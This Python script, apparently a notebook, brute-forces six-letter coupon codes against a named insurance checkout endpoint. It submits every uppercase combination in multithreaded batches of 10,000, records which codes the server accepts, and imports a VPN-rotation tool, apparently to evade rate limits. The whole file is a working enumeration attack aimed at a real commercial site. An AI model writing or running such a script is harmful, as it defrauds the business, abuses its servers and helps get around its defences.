# %%
from itertools import product
from random import randint
from nordvpn_switcher import rotate_VPN
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import pandas as pd
from datetime import datetime
import string

def get_code(code):
    try:
        response = requests.get(f'https://purchase.simplesurance.nl/purchase/process-coupon/29409/50821/{code}')
        if response.status_code == 400:
            valid_page = False
        if response.status_code == 201:
            valid_page = True
        return code, valid_page
    except Exception:
        return 0,0

#%%



def request_code(lst):
    with open('valid_code.csv','a') as f:
        threads = []
        id_result = {}
        with ThreadPoolExecutor(max_workers=6) as executor:

            for number in lst:
                threads.append(executor.submit(get_code, number))
            for task in as_completed(threads):
                id, result = task.result()
                if id != 0:
                    id_result[id] = result
                    print(str(id) + ': '+str(result),file=f)
    return id_result
# [1] save settings file as a variable

archive = pd.read_csv('valid_code.csv',sep=': ',index_col=0,names=['id','value'], engine='python')

#%%
input_list = []
for ugly in product(string.ascii_uppercase, repeat = 6):
    number = ''.join(ugly)
    if number in archive.index:
        continue
    else:
        input_list.append(number)
    
    if len(input_list) == 10000:
        print('starting request stream')
        
        now = datetime.now()

        current_time = now.strftime("%H:%M:%S")
        print("input list is ", len(input_list), ' long')
        print("Current Time =", current_time)
        request_code(input_list)
                
        now = datetime.now()

        current_time = now.strftime("%H:%M:%S")
        print("Current Time =", current_time)
        input_list = []
        